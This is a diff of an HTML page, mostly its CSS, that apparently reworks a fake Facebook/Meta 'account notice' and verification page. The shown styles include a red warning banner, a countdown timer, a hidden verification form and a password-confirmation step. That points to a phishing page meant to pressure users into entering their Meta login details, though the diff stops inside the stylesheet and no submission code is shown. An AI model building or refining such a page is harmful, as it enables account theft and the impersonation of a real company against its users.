@@ -1,2537 +1,1132 @@
-
-
-
-
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 Facebook Security Review | Account Verification</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>Account Notice - Meta</title>
     <style>
+        /* Base styles for both pages */
         :root {
-            /* Light Theme */
-            --primary-color: #1877f2;
-            --primary-hover: #166fe5;
-            --danger-color: #f02849;
-            --danger-light: rgba(240, 40, 73, 0.1);
-            --success-color: #00a400;
-            --success-light: rgba(0, 164, 0, 0.1);
-            --warning-color: #ff9c00;
-            --warning-light: rgba(255, 156, 0, 0.1);
-            --text-primary: #050505;
-            --text-secondary: #65676b;
-            --text-tertiary: #8a8d91;
-            --border-color: #dddfe2;
-            --bg-primary: #f0f2f5;
-            --bg-secondary: #ffffff;
-            --shadow-sm: 0 1px 2px rgba(0,0,0,0.1);
-            --shadow-md: 0 4px 12px rgba(0,0,0,0.1);
-            --shadow-lg: 0 8px 24px rgba(0,0,0,0.15);
-            --radius-sm: 6px;
-            --radius-md: 8px;
-            --radius-lg: 12px;
-            --radius-xl: 16px;
-            --transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            --primary-blue: #1877f2;
+            --secondary-blue: #166fe5;
+            --dark-blue: #3b5998;
+            --light-gray: #f0f2f5;
+            --medium-gray: #dddfe2;
+            --dark-gray: #606770;
+            --text-dark: #1d2129;
+            --white: #ffffff;
+            --error-red: #d9534f;
+            --success-green: #42b72a;
         }
-
-        /* Dark Theme */
-        .dark-mode {
-            --primary-color: #4599ff;
-            --primary-hover: #3a8aee;
-            --danger-color: #ff5b7b;
-            --danger-light: rgba(255, 91, 123, 0.1);
-            --success-color: #42b72a;
-            --success-light: rgba(66, 183, 42, 0.1);
-            --warning-color: #ffba00;
-            --warning-light: rgba(255, 186, 0, 0.1);
-            --text-primary: #e4e6eb;
-            --text-secondary: #b0b3b8;
-            --text-tertiary: #8a8d91;
-            --border-color: #3e4042;
-            --bg-primary: #18191a;
-            --bg-secondary: #242526;
-            --shadow-sm: 0 1px 2px rgba(0,0,0,0.3);
-            --shadow-md: 0 4px 12px rgba(0,0,0,0.3);
-            --shadow-lg: 0 8px 24px rgba(0,0,0,0.4);
-        }
-
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+            font-family: 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
         }
-
+        
         body {
-            background: var(--bg-primary);
-            color: var(--text-primary);
+            background-color: var(--light-gray);
+            color: var(--text-dark);
             line-height: 1.6;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-            overflow-x: hidden;
-            transition: background 0.3s ease;
-        }
-
-        /* Header Styles */
-        .header {
-            background: var(--bg-secondary);
-            padding: 12px 0;
-            box-shadow: var(--shadow-sm);
-            position: sticky;
-            top: 0;
-            z-index: 100;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            transition: background 0.3s ease;
-        }
-
-        .header-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            padding: 0 16px;
-            width: 100%;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            color: var(--primary-color);
-            font-size: 22px;
-            font-weight: 600;
-        }
-
-        .logo i {
-            font-size: 26px;
-        }
-
-        .header-actions {
-            display: flex;
-            align-items: center;
-            gap: 16px;
-        }
-
-        .theme-toggle {
-            background: var(--bg-primary);
-            border: none;
-            border-radius: 50%;
-            width: 36px;
-            height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: var(--transition);
-        }
-
-        .theme-toggle:hover {
-            background: var(--border-color);
-        }
-
-        .theme-toggle i {
-            color: var(--text-primary);
-            font-size: 18px;
-        }
-
-        .help-center {
-            color: var(--text-secondary);
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 6px;
             font-size: 14px;
-            transition: var(--transition);
-            text-decoration: none;
         }
-
-        .help-center:hover {
-            color: var(--primary-color);
-        }
-
-        /* Security Badge */
-        .security-badge {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 14px;
-            color: var(--text-secondary);
-            font-weight: 500;
-        }
-
-        .security-badge i {
-            color: var(--success-color);
-        }
-
-        /* Main Content */
-        .container {
-            max-width: 900px;
-            margin: 32px auto;
-            padding: 0 16px;
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        /* Review Card */
-        .review-card {
-            background: var(--bg-secondary);
-            border-radius: var(--radius-xl);
-            box-shadow: var(--shadow-md);
-            padding: 40px;
-            width: 100%;
-            position: relative;
-            overflow: hidden;
-            border: 1px solid var(--border-color);
-            margin-bottom: 32px;
+        
+        /* Improved Notification Page Styles */
+        .notification-container {
+            max-width: 500px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 30px;
             text-align: center;
-            transition: var(--transition);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
-
-        .review-card:hover {
-            box-shadow: var(--shadow-lg);
-            transform: translateY(-2px);
+        
+        .notification-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
         }
-
-        .warning-icon {
-            font-size: 60px;
-            color: var(--danger-color);
-            margin-bottom: 20px;
-            text-align: center;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.08); }
-            100% { transform: scale(1); }
-        }
-
-        .review-title {
-            font-size: 28px;
-            margin-bottom: 16px;
-            color: var(--text-primary);
-            font-weight: 700;
-            text-align: center;
-        }
-
-        .review-subtitle {
-            font-size: 16px;
-            color: var(--text-secondary);
-            max-width: 600px;
-            margin: 0 auto 24px;
-            line-height: 1.5;
-            text-align: center;
-        }
-
-        /* Alert Boxes */
-        .alert-box {
-            display: flex;
-            gap: 12px;
-            margin: 24px 0;
-            padding: 16px;
-            border-radius: var(--radius-md);
-            background: var(--bg-primary);
-            border-left: 3px solid;
-        }
-
-        .alert-danger {
-            border-left-color: var(--danger-color);
-            background: var(--danger-light);
-        }
-
-        .alert-warning {
-            border-left-color: var(--warning-color);
-            background: var(--warning-light);
-        }
-
-        .alert-success {
-            border-left-color: var(--success-color);
-            background: var(--success-light);
-        }
-
-        .alert-box h3 {
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 18px;
-        }
-
-        .alert-danger h3 {
-            color: var(--danger-color);
-        }
-
-        .alert-warning h3 {
-            color: var(--warning-color);
-        }
-
-        .alert-success h3 {
-            color: var(--success-color);
-        }
-
-        .alert-box ul {
-            padding-left: 20px;
-        }
-
-        .alert-box li {
-            margin-bottom: 10px;
-            font-size: 15px;
-            line-height: 1.5;
-            color: var(--text-primary);
-        }
-
-        /* Buttons */
-        .btn {
-            padding: 12px 24px;
-            border-radius: var(--radius-md);
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: var(--transition);
-            text-align: center;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn-primary {
-            background: var(--primary-color);
-            color: #ffffff;
-            border: none;
-        }
-
-        .btn-primary:hover {
-            background: var(--primary-hover);
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.2);
-        }
-
-        .btn-outline {
-            background: transparent;
-            color: var(--primary-color);
-            border: 1px solid var(--primary-color);
-        }
-
-        .btn-outline:hover {
-            background: rgba(24, 119, 242, 0.05);
-            transform: translateY(-2px);
-        }
-
-        .btn-danger {
-            background: var(--danger-color);
-            color: #ffffff;
-            border: none;
-        }
-
-        .btn-danger:hover {
-            background: #d41f3e;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 12px rgba(240, 40, 73, 0.2);
-        }
-
-        .btn-lg {
-            padding: 14px 32px;
-            font-size: 16px;
-        }
-
-        .btn::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
-            transition: 0.5s;
-        }
-
-        .btn:hover::after {
-            left: 100%;
-        }
-
-        /* Modal Styles */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.6);
-            z-index: 1001;
-            overflow-y: auto;
-            padding: 16px;
-        }
-
-        .modal-content {
-            background: var(--bg-secondary);
-            border-radius: var(--radius-xl);
-            box-shadow: var(--shadow-lg);
-            max-width: 800px;
-            margin: 32px auto;
-            position: relative;
-            overflow: hidden;
-            animation: modalAppear 0.3s ease;
-            border: 1px solid var(--border-color);
-            transition: background 0.3s ease;
-        }
-
-        @keyframes modalAppear {
-            from { transform: translateY(30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-
-        .modal-header {
-            padding: 20px;
-            background: var(--bg-secondary);
-            color: var(--text-primary);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid var(--border-color);
-            transition: background 0.3s ease;
-        }
-
-        .modal-title {
-            font-size: 20px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            color: var(--primary-color);
-        }
-
-        .close-modal {
-            background: transparent;
-            border: none;
-            color: var(--text-secondary);
-            font-size: 24px;
-            cursor: pointer;
-            transition: var(--transition);
-            width: 36px;
-            height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            border-radius: 50%;
-        }
-
-        .close-modal:hover {
-            background: var(--bg-primary);
-            transform: rotate(90deg);
-        }
-
-        .modal-body {
-            padding: 24px;
-        }
-
-        /* Step Indicator */
-        .step-indicator {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin-bottom: 24px;
-            position: relative;
-        }
-
-        .step {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            background: var(--bg-primary);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 600;
-            position: relative;
-            z-index: 2;
-            color: var(--text-secondary);
-            font-size: 15px;
-            transition: var(--transition);
-        }
-
-        .step.active {
-            background: var(--primary-color);
-            color: #ffffff;
-        }
-
-        .step.completed {
-            background: var(--success-color);
-            color: #ffffff;
-        }
-
-        .step-line {
-            position: absolute;
-            top: 50%;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: var(--bg-primary);
-            z-index: 1;
-        }
-
-        .progress-line {
-            position: absolute;
-            top: 50%;
-            left: 0;
-            width: 0%;
-            height: 2px;
-            background: var(--primary-color);
-            z-index: 1;
-            transition: width 0.3s ease;
-        }
-
-        /* Step Content */
-        .step-content {
-            display: none;
-        }
-
-        .step-content.active {
-            display: block;
-            animation: fadeIn 0.4s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(8px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .step-title {
-            text-align: center;
-            font-size: 20px;
-            margin-bottom: 20px;
-            color: var(--text-primary);
-            font-weight: 600;
-        }
-
-        /* Video Player Styles */
-        .video-player-container {
-            position: relative;
-            width: 100%;
-            background: #000000;
-            border-radius: var(--radius-lg);
-            overflow: hidden;
-            margin: 20px 0;
-            box-shadow: var(--shadow-md);
-        }
-
-        .video-container {
-            position: relative;
-            padding-top: 56.25%; /* 16:9 Aspect Ratio */
-        }
-
-        .video-container video {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            border: none;
-            object-fit: cover;
-        }
-
-        .video-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            z-index: 2;
-            transition: opacity 0.3s ease;
-        }
-
-        .video-overlay.hidden {
-            opacity: 0;
-            pointer-events: none;
-        }
-
-        .play-btn {
-            background: var(--primary-color);
-            width: 64px;
-            height: 64px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            margin-bottom: 16px;
-            border: 2px solid #ffffff;
-            transition: var(--transition);
-        }
-
-        .play-btn:hover {
-            transform: scale(1.1);
-            background: var(--primary-hover);
-        }
-
-        .play-btn i {
-            font-size: 32px;
-            color: #ffffff;
-        }
-
-        /* Loading Spinner */
-        .loading-spinner {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 3;
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            background: rgba(0,0,0,0.6);
-            border-radius: 50%;
-            width: 80px;
-            height: 80px;
-        }
-
-        .spinner {
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-top: 3px solid var(--primary-color);
-            border-radius: 50%;
+        
+        .meta-logo {
             width: 40px;
             height: 40px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 8px;
+            margin-bottom: 20px;
         }
-
-        .loading-percentage {
-            color: #ffffff;
-            font-size: 14px;
-            font-weight: 600;
+        
+        .warning-header {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--error-red);
+            margin-bottom: 20px;
+            position: relative;
+            padding-bottom: 10px;
         }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Video Controls */
-        .video-controls {
+        
+        .warning-header:after {
+            content: '';
             position: absolute;
             bottom: 0;
-            left: 0;
-            width: 100%;
-            background: rgba(0, 0, 0, 0.6);
-            padding: 8px 12px;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            z-index: 10;
-            transform: translateY(100%);
-            transition: var(--transition);
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60px;
+            height: 3px;
+            background-color: var(--error-red);
+            border-radius: 3px;
         }
-
-        .video-container:hover .video-controls {
+        
+        .content-text {
+            font-size: 15px;
+            margin-bottom: 20px;
+            text-align: left;
+            color: var(--dark-gray);
+        }
+        
+        .content-text p {
+            margin-bottom: 15px;
+        }
+        
+        .divider {
+            height: 1px;
+            background-color: var(--medium-gray);
+            margin: 25px 0;
+            border: 0;
+        }
+        
+        .support-header {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--primary-blue);
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        .action-button {
+            display: inline-block;
+            background-color: var(--primary-blue);
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
+            padding: 12px 24px;
+            border-radius: 8px;
+            text-decoration: none;
+            margin-top: 15px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            width: 100%;
+            max-width: 200px;
+            box-shadow: 0 2px 8px rgba(24, 119, 242, 0.3);
+        }
+        
+        .action-button:hover {
+            background-color: var(--secondary-blue);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4);
+        }
+        
+        .action-button:active {
             transform: translateY(0);
         }
-
-        .control-btn {
-            background: none;
-            border: none;
-            color: #ffffff;
-            font-size: 14px;
-            cursor: pointer;
-            padding: 4px 8px;
-            outline: none;
-        }
-
-        .progress-container {
-            flex-grow: 1;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 8px;
-            margin: 0 12px;
-            cursor: pointer;
-            position: relative;
-        }
-
-        .buffered-bar {
-            position: absolute;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.3);
-            border-radius: 8px;
-            width: 0%;
-        }
-
-        .progress-bar {
-            height: 100%;
-            background: var(--primary-color);
-            border-radius: 8px;
-            position: relative;
-            width: 0%;
-            z-index: 2;
-        }
-
-        .time-display {
-            color: #ffffff;
-            font-size: 13px;
-            min-width: 80px;
+        
+        .footer {
             text-align: center;
+            color: var(--dark-gray);
+            font-size: 12px;
+            margin-top: 30px;
+            padding-top: 15px;
+            border-top: 1px solid var(--medium-gray);
+        }
+        
+        /* Countdown timer */
+        .countdown {
+            background-color: #fff4f4;
+            border: 1px solid #ffd6d6;
+            border-radius: 6px;
+            padding: 10px;
+            margin: 15px 0;
+            font-weight: 600;
+            color: var(--error-red);
+        }
+        
+        /* Loading dots animation */
+        .loading-dots span {
+            display: inline-block;
+            animation: loading 1.4s infinite both;
+        }
+        
+        .loading-dots span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        
+        .loading-dots span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+        
+        @keyframes loading {
+            0%, 80%, 100% { opacity: 0.3; }
+            40% { opacity: 1; }
+        }
+        
+        /* Responsive improvements */
+        @media (max-width: 600px) {
+            .notification-container {
+                margin: 20px 15px;
+                padding: 20px;
+                border-radius: 8px;
+            }
+            
+            .warning-header {
+                font-size: 20px;
+            }
+            
+            .action-button {
+                max-width: 100%;
+                padding: 12px 20px;
+            }
         }
 
-        .volume-container {
+        /* Verification Form Styles (unchanged from original) */
+        #verificationForm {
+            display: none;
+        }
+        
+        #root {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: linear-gradient(to right, var(--dark-blue), #2d4373);
+            height: 80px;
             display: flex;
             align-items: center;
-            margin: 0 12px;
+            padding: 0 40px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            justify-content: space-between;
         }
-
-        .volume-slider {
-            width: 60px;
-            margin-left: 4px;
-            -webkit-appearance: none;
-            height: 4px;
-            background: rgba(255, 255, 255, 0.2);
+        
+        .header h1 {
+            color: var(--white);
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        
+        .language-selector {
+            background-color: rgba(255,255,255,0.2);
+            border: none;
+            color: white;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+        
+        .language-selector option {
+            background-color: var(--dark-blue);
+        }
+        
+        .sub-header {
+            background-color: var(--white);
+            height: 60px;
+            display: flex;
+            align-items: center;
+            padding: 0 40px;
+            border-bottom: 1px solid var(--medium-gray);
+        }
+        
+        .sub-header h4 {
+            color: var(--primary-blue);
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 30px 20px;
+        }
+        
+        .verification-card {
+            background-color: var(--white);
             border-radius: 8px;
-            outline: none;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 680px;
+            overflow: hidden;
         }
-
-        .volume-slider::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: var(--primary-color);
-            cursor: pointer;
+        
+        .card-header {
+            background-color: var(--light-gray);
+            padding: 16px 24px;
+            border-bottom: 1px solid var(--medium-gray);
         }
-
-        .speed-selector {
-            background: rgba(255, 255, 255, 0.1);
-            color: #ffffff;
+        
+        .card-header h5 {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+        
+        .card-body {
+            padding: 24px;
+            position: relative;
+        }
+        
+        .alert-message {
+            margin-bottom: 20px;
+        }
+        
+        .alert-message p {
+            margin-bottom: 12px;
+            color: var(--text-dark);
+        }
+        
+        .video-container {
+            margin: 0 0 20px 0;
+            text-align: left;
+            width: 100%;
+        }
+        
+        .form-container {
+            width: 100%;
+        }
+        
+        .video-label {
+            font-size: 12px;
+            color: var(--dark-gray);
+            margin-bottom: 8px;
+            display: block;
+        }
+        
+        video {
+            max-width: 100%;
+            height: auto;
+            border-radius: 4px;
+            border: 1px solid var(--medium-gray);
+        }
+        
+        .sound-toggle {
+            background-color: var(--primary-blue);
+            color: var(--white);
             border: none;
             border-radius: 4px;
-            padding: 4px;
-            margin: 0 12px;
-            cursor: pointer;
+            padding: 8px 16px;
             font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            margin: 10px 0 20px;
+            transition: background-color 0.2s;
         }
-
-        .fullscreen-btn {
-            margin-left: auto;
+        
+        .sound-toggle:hover {
+            background-color: var(--secondary-blue);
         }
-
-        /* Form Styles */
+        
         .form-group {
             margin-bottom: 20px;
         }
-
-        .form-group label {
+        
+        .form-label {
             display: block;
+            font-size: 13px;
+            color: var(--dark-gray);
             margin-bottom: 8px;
-            font-weight: 600;
-            color: var(--text-primary);
-            font-size: 15px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+            font-weight: 500;
         }
-
-        .form-group label i {
-            color: var(--danger-color);
-            font-size: 18px;
-        }
-
+        
         .form-control {
             width: 100%;
-            padding: 12px 16px;
-            border: 1px solid var(--border-color);
-            border-radius: var(--radius-md);
-            font-size: 15px;
-            transition: var(--transition);
-            background: var(--bg-primary);
-            color: var(--text-primary);
+            padding: 12px;
+            border: 1px solid var(--medium-gray);
+            border-radius: 4px;
+            font-size: 14px;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
-
+        
         .form-control:focus {
-            border-color: var(--primary-color);
             outline: none;
-            background: var(--bg-secondary);
-            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
         }
-
-        .form-text {
-            font-size: 13px;
-            color: var(--text-secondary);
-            margin-top: 4px;
-        }
-
-        /* Mobile Instructions */
-        .mobile-instructions {
-            background: var(--danger-light);
-            border-radius: var(--radius-md);
-            padding: 20px;
-            margin: 20px 0;
-            border-left: 3px solid var(--danger-color);
-        }
-
-        .mobile-instructions h3 {
-            color: var(--danger-color);
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 18px;
-        }
-
-        .mobile-instructions ol {
-            padding-left: 20px;
-        }
-
-        .mobile-instructions li {
-            margin-bottom: 10px;
-            font-size: 15px;
-            line-height: 1.5;
-            color: var(--text-primary);
-        }
-
-        /* Button Group */
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            margin-top: 20px;
-        }
-
-        /* Success Message */
-        .success-message {
-            text-align: center;
-            padding: 32px 16px;
-        }
-
-        .success-icon {
-            font-size: 60px;
-            color: var(--success-color);
-            margin-bottom: 20px;
-            animation: successPulse 1.5s infinite;
-        }
-
-        @keyframes successPulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.08); }
-            100% { transform: scale(1); }
-        }
-
-        .success-title {
-            font-size: 28px;
-            margin-bottom: 16px;
-            color: var(--text-primary);
-            font-weight: 700;
-        }
-
-        .success-text {
-            font-size: 16px;
-            color: var(--text-secondary);
-            max-width: 500px;
-            margin: 0 auto 24px;
-            line-height: 1.5;
-        }
-
-        /* Status Indicator */
-        .status-indicator {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin: 16px 0;
-            padding: 12px;
-            border-radius: var(--radius-md);
-            background: var(--bg-primary);
-        }
-
-        .status-indicator i {
-            font-size: 20px;
-        }
-
-        .status-active i {
-            color: var(--success-color);
-        }
-
-        .status-warning i {
-            color: var(--warning-color);
-        }
-
-        .status-danger i {
-            color: var(--danger-color);
-        }
-
-        /* Progress Bar */
-        .progress {
-            height: 8px;
-            background: var(--bg-primary);
-            border-radius: 4px;
-            margin: 16px 0;
-            overflow: hidden;
-        }
-
-        .progress-bar {
-            height: 100%;
-            background: var(--primary-color);
-            border-radius: 4px;
-            transition: width 0.3s ease;
-        }
-
-        /* Footer */
-        footer {
-            background: var(--bg-secondary);
-            padding: 24px 0;
-            border-top: 1px solid var(--border-color);
-            margin-top: auto;
-            transition: background 0.3s ease;
-        }
-
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 16px;
-            text-align: center;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin: 16px 0;
-            flex-wrap: wrap;
-        }
-
-        .footer-links a {
-            color: var(--text-secondary);
-            text-decoration: none;
-            transition: var(--transition);
-            font-weight: 500;
-            font-size: 14px;
-        }
-
-        .footer-links a:hover {
-            color: var(--primary-color);
-        }
-
-        .copyright {
-            color: var(--text-tertiary);
-            font-size: 13px;
-            margin-top: 12px;
-        }
-
-        /* Video Quality Selector */
-        .quality-selector {
-            position: absolute;
-            top: 12px;
-            right: 12px;
-            z-index: 20;
-            background: rgba(0,0,0,0.6);
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            padding: 4px 8px;
-            font-size: 13px;
-            cursor: pointer;
-        }
-
-        /* Network Status */
-        .network-status {
-            position: absolute;
-            top: 12px;
-            left: 12px;
-            z-index: 20;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            color: #ffffff;
-            font-size: 11px;
-            background: rgba(0,0,0,0.5);
-            padding: 2px 6px;
-            border-radius: 4px;
-        }
-
-        .network-status i {
-            color: var(--success-color);
-        }
-
-        /* Hidden form for submission */
-        .hidden-form {
-            display: none;
-        }
-
-        /* Error message styles */
-        .error-message {
-            color: var(--danger-color);
-            font-size: 14px;
-            text-align: center;
-            margin-top: 12px;
-            display: none;
-        }
-
-        /* Language Selector */
-        .language-selector {
-            position: absolute;
-            top: 12px;
-            right: 100px;
-            z-index: 20;
-            background: rgba(0,0,0,0.6);
-            color: #ffffff;
-            border: none;
-            border-radius: 4px;
-            padding: 4px 8px;
-            font-size: 13px;
-            cursor: pointer;
-        }
-
-        /* Security Verification */
-        .security-verification {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin: 16px 0;
-            padding: 12px;
-            background: var(--bg-primary);
-            border-radius: var(--radius-md);
-        }
-
-        .security-verification i {
-            color: var(--success-color);
-            font-size: 20px;
-        }
-
-        /* Responsive Styles */
-        @media (max-width: 768px) {
-            .review-card {
-                padding: 24px 16px;
-            }
-
-            .review-title {
-                font-size: 24px;
-            }
-
-            .review-subtitle {
-                font-size: 15px;
-            }
-
-            .btn-lg {
-                padding: 12px 24px;
-                font-size: 15px;
-            }
-
-            .modal-content {
-                margin: 16px auto;
-            }
-
-            .modal-header {
-                padding: 16px;
-            }
-
-            .modal-title {
-                font-size: 18px;
-            }
-
-            .modal-body {
-                padding: 16px;
-            }
-
-            .btn-group {
-                flex-direction: column;
-            }
-
-            .video-controls {
-                padding: 6px 8px;
-            }
-
-            .control-btn {
-                padding: 2px 4px;
-                font-size: 13px;
-            }
-
-            .time-display {
-                min-width: 60px;
-                font-size: 12px;
-            }
-
-            .volume-slider {
-                width: 40px;
-            }
-
-            .header-content {
-                flex-direction: column;
-                align-items: stretch;
-                gap: 12px;
-            }
-
-            .logo {
-                justify-content: center;
-            }
-
-            .help-center {
-                justify-content: center;
-            }
-
-            .security-badge {
-                justify-content: center;
-            }
-        }
-
-        /* Animation for important elements */
-        .shake {
-            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
-        }
-
-        @keyframes shake {
-            10%, 90% { transform: translateX(-1px); }
-            20%, 80% { transform: translateX(2px); }
-            30%, 50%, 70% { transform: translateX(-4px); }
-            40%, 60% { transform: translateX(4px); }
-        }
-
-        /* Tooltip */
-        .tooltip {
-            position: relative;
-            display: inline-block;
-        }
-
-        .tooltip .tooltiptext {
-            visibility: hidden;
-            width: 200px;
-            background-color: #333;
-            color: #fff;
-            text-align: center;
-            border-radius: 6px;
-            padding: 8px;
-            position: absolute;
-            z-index: 1;
-            bottom: 125%;
-            left: 50%;
-            transform: translateX(-50%);
-            opacity: 0;
-            transition: opacity 0.3s;
-            font-size: 13px;
-            font-weight: normal;
-        }
-
-        .tooltip:hover .tooltiptext {
-            visibility: visible;
-            opacity: 1;
-        }
-
-        /* Countdown Timer */
-        .countdown-timer {
-            display: flex;
-            justify-content: center;
-            gap: 8px;
-            margin: 16px 0;
-        }
-
-        .countdown-item {
-            text-align: center;
-            background: var(--danger-light);
-            padding: 8px 12px;
-            border-radius: var(--radius-md);
-            min-width: 60px;
-        }
-
-        .countdown-value {
-            font-size: 20px;
-            font-weight: 700;
-            color: var(--danger-color);
-        }
-
-        .countdown-label {
+        
+        .form-note {
             font-size: 12px;
-            color: var(--text-secondary);
+            color: var(--dark-gray);
+            margin-top: 20px;
+            padding: 12px;
+            background-color: var(--light-gray);
+            border-radius: 4px;
         }
-
-        /* Webcam Verification */
-        .webcam-container {
-            width: 100%;
-            margin: 20px 0;
-            border-radius: var(--radius-md);
-            overflow: hidden;
-            background: var(--bg-primary);
-            border: 1px solid var(--border-color);
-            position: relative;
+        
+        .card-footer {
+            background-color: var(--light-gray);
+            padding: 16px 24px;
+            border-top: 1px solid var(--medium-gray);
+            text-align: right;
         }
-
-        .webcam-video {
-            width: 100%;
+        
+        .submit-btn {
+            background-color: var(--primary-blue);
+            color: var(--white);
+            border: none;
+            border-radius: 4px;
+            padding: 10px 24px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .submit-btn:hover {
+            background-color: var(--secondary-blue);
+        }
+        
+        .password-confirmation {
+            display: none;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid var(--medium-gray);
+            text-align: center;
+        }
+        
+        .password-confirmation.active {
             display: block;
